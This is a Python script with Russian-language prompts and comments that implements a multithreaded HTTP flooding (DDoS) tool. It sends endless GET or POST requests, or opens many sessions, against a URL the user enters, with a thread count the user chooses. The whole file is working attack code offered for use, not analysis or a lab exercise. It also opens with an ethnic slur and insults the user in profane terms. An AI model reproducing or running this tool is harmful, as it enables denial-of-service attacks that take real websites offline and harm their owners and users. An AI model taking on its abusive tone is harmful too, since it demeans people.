# Yes, everything in Russian. Sasat, pendosi.

import requests
import threading
 
 
def getDDOS(url): # Get атака
    while True:
        my_request = requests.get(url)
        status_of_request = my_request.status_code
        if status_of_request == 200:
            print("Успешый запрос.")
        else:
            print("Ошибка!")
 
 
def postDDOS(url, my_data): # Post атака
    while True:
        my_request = requests.post(url, data=my_data)
        status_of_request = my_request.status_code
        if status_of_request == 200:
            print("Успешый запрос.")
        else:
            print("Ошибка!")
 
 
def sessionDDOS(url): # Session атака
 
    numb_sessions = int(input("Введите количество подключений: "))
    sessions = []
    for i in range(numb_sessions):
        sessions.append(requests.Session())
        my_request = sessions[i].get(url)
        status_of_request = my_request.status_code
        if status_of_request == 200:
            print("Успешый запрос.")
        else:
            print("Ошибка!")
 
 
repeat = True
while repeat:
    repeat = False
    question = input("Что вам нужно, get, session или post запрос?\n \
    Для того чтобы выбрать get или post - введите \"get\" или \"post\" или \"session\".\n \
    Для справки введите - \"помощь\": ")
    question.lower()
 
    sendGet = True
    sendPost = True
    sendSession = True
 
    if question == "помощь":
        print("При get запросе будет получен HTML код страницы.\n \
    При post запросе можно будет отправить на сервер определенные данные. Например ввод логина и пароля.")
        repeat = True
    elif question == "post":
        sendGet = False
        sendSession = False
    elif question == "get":
        sendPost = False
        sendSession = False
    elif question == "session":
        sendPost = False
        sendGet = False
    else:
        print("Иди нахуй. Нормально не можешь ввод сделать, а сам пытаешься дудосить, хакер мамин.")
 
url = input("Введите URL сайта: ")
 
if sendGet:
    numb_threads = int(input("Введите количество потоков: "))
    threads = []
    for i in range(numb_threads):
        threads.append(threading.Thread(target=getDDOS, kwargs={"url": url}))
        threads[i].start()
elif sendPost:
    numb_threads = int(input("Введите количество потоков: "))
    threads = []
    numb_sends = int(input("Введите количество полей ввода: "))
    inputs = []
    sends = []
    for i in range(numb_sends):
        inputs.append(input("Введите имя поля ввода: "))
        sends.append(input("Введите значение поля ввода: "))
    my_data = dict(zip(inputs, sends))
    for i in range(numb_threads):
        threads.append(threading.Thread(target=postDDOS, kwargs={"url": url, "my_data": my_data}))
        threads[i].start()
elif sendSession:
    sessionDDOS(url)
else:
    print("Ошибка. Обратитесь к разработчику программного обеспечения.")# your code goes here
